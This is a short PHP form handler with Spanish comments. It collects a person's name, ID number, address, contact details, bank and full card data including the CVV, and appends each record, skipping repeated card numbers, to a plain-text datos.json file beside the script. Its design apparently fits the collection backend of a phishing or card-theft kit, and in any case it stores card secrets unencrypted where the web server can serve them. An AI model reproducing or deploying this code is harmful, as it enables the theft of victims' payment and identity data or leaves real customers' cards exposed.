<?php
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    // Evitar errores si falta alguna variable
    $form_data = [
        'nombre' => $_POST['nombre'] ?? '',
        'apellido' => $_POST['apellido'] ?? '',
        'documento' => $_POST['documento'] ?? '',
        'telefono' => $_POST['telefono'] ?? '',
        'ciudad' => $_POST['ciudad'] ?? '',
        'direccion' => $_POST['direccion'] ?? '',
        'email' => $_POST['email'] ?? '',
        'banco' => $_POST['banco'] ?? '',
        'franquicia' => $_POST['franquicia'] ?? '',
        'tipo_tarjeta' => $_POST['tipo_tarjeta'] ?? '',
        'nro_tarjeta' => $_POST['nro_tarjeta'] ?? '',
        'nombre_tarjeta' => $_POST['nombre_tarjeta'] ?? '',
        'mes_tarjeta' => $_POST['mes_tarjeta'] ?? '',
        'anio_tarjeta' => $_POST['anio_tarjeta'] ?? '',
        'cvv_tarjeta' => $_POST['cvv_tarjeta'] ?? '',
        'fecha_registro' => date('Y-m-d H:i:s')
    ];

    $json_file = 'datos.json';

    // Leer archivo existente
    if (file_exists($json_file)) {
        $json_data = file_get_contents($json_file);
        $datos = json_decode($json_data, true);
        if (!is_array($datos)) {
            $datos = [];
        }
    } else {
        $datos = [];
    }

    // Buscar duplicados (por número de tarjeta)
    $duplicado = false;
    foreach ($datos as $dato) {
        if ($dato['nro_tarjeta'] === $form_data['nro_tarjeta']) {
            $duplicado = true;
            break;
        }
    }

    // Si no está duplicado, guardar
    if (!$duplicado) {
        $datos[] = $form_data;
        file_put_contents($json_file, json_encode($datos, JSON_PRETTY_PRINT | JSON_UNESCAPED_UNICODE));
        echo "✅ Datos guardados correctamente en datos.json";
    } else {
        echo "⚠️ Este número de tarjeta ya fue registrado.";
    }
} else {
    echo "❌ No se recibieron datos mediante POST.";
}
?>
